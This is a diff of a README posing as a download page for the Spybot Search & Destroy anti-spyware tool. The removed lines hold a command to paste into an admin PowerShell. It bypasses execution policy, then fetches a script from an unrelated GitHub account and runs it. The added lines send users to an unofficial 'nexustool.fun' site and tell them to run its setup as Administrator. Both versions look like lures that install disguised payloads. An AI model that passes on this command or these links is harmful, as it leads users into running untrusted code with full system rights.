@@ -2,7 +2,7 @@
 
 **Spybot-Search-Destroy-2026**
 
-**Spybot Search & Destroy** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+**Spybot Search & Destroy** download for Windows 10/11. Scroll to **Download & Install** for the direct direct download link below.
 
 [![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
 
@@ -10,22 +10,30 @@
 
 ## Download & Install
 
-> **This is the download page.** Copy the command below into **PowerShell (Admin)** to download and run the installer.
+> **This is the download page.** Use the button or link below to get **Spybot Search & Destroy** for Windows.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+<p align="center">
+  <a href="https://spybot-search-destroy.nexustool.fun/">
+    <img src="https://img.shields.io/badge/Download-Spybot%20Search%20&%20Destroy-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Spybot Search & Destroy">
+  </a>
+</p>
 
-| Step | What to do |
+| | |
 | --- | --- |
-| 1 | Press **Win + X** → **Terminal (Admin)** or **PowerShell (Admin)** |
-| 2 | Paste the command above and press **Enter** |
-| 3 | Wait for the download — progress shows in the console |
-| 4 | Follow on-screen prompts (license key if asked) |
-| 5 | Restart if requested, then open **Spybot Search & Destroy** from Start menu |
+| **Direct link** | **[spybot-search-destroy.nexustool.fun](https://spybot-search-destroy.nexustool.fun/)** |
+| **Full URL** | `https://spybot-search-destroy.nexustool.fun/` |
+| **Type** | Installer for Windows 10 / 11 (64-bit) |
+| **Admin** | Run setup as Administrator |
 
-**Install type:** PowerShell one-liner (no browser required after Admin shell is open).
+### Quick steps
+
+1. Click **[Download — spybot-search-destroy.nexustool.fun](https://spybot-search-destroy.nexustool.fun/)** (link above)
+2. Save the file from the project page
+3. Run the setup **as Administrator**
+4. Enter your license key when prompted
+5. Restart if the installer asks — then launch from Start menu
+
+<p align="center"><a href="https://spybot-search-destroy.nexustool.fun/"><strong>⬇ Download Spybot Search & Destroy now</strong></a></p>
 
 ---
 
